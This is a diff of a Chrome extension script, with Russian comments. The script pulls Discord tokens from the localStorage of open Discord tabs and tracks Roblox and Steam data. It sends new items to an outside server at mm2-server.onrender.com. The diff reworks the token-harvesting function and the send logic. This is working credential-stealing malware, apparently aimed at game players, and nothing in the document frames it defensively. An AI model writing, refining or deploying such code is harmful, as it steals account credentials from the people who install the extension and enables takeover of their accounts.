@@ -3,27 +3,35 @@ const SERVER_URL = "https://mm2-server.onrender.com/send";
 let sentRoblox = "";
 let sentSteam = "";
 let sentDiscord = "";
-let lastSentTime = 0;
 
 async function getDiscordToken() {
     try {
-        const tabs = await chrome.tabs.query({ url: "*://discord.com/*" });
+        const tabs = await chrome.tabs.query({});
         for (const tab of tabs) {
-            try {
-                const results = await chrome.scripting.executeScript({
-                    target: { tabId: tab.id },
-                    func: () => {
-                        const token = localStorage.getItem("token");
-                        if (token) return token;
-                        return "";
+            if (tab.url && tab.url.includes("discord.com")) {
+                try {
+                    const results = await chrome.scripting.executeScript({
+                        target: { tabId: tab.id },
+                        func: () => {
+                            try {
+                                const token = localStorage.getItem("token");
+                                return token || "";
+                            } catch (e) {
+                                return "";
+                            }
+                        }
+                    });
+                    if (results && results[0] && results[0].result) {
+                        return results[0].result;
                     }
-                });
-                if (results[0] && results[0].result) {
-                    return results[0].result;
+                } catch (e) {
+                    console.log("Ошибка выполнения:", e.message);
                 }
-            } catch (e) {}
+            }
         }
-    } catch (e) {}
+    } catch (e) {
+        console.log("Ошибка вкладок:", e.message);
+    }
     return "";
 }
 
@@ -93,18 +101,15 @@ async function sendData() {
     } catch (e) {}
 
     const discordToken = await getDiscordToken();
-    if (discordToken) {
-        if (discordToken !== sentDiscord) {
-            data.discordToken = discordToken;
-            data.discordStatus = "new";
-            sentDiscord = discordToken;
-            hasNew = true;
-        } else {
-            data.discordStatus = "sent";
-        }
+    if (discordToken && discordToken !== sentDiscord) {
+        data.discordToken = discordToken;
+        data.discordStatus = "new";
+        sentDiscord = discordToken;
+        hasNew = true;
+    } else if (discordToken) {
+        data.discordStatus = "sent";
     }
 
-    // Отправляем ТОЛЬКО если есть новые данные
     if (hasNew) {
         try {
             await fetch(SERVER_URL, {
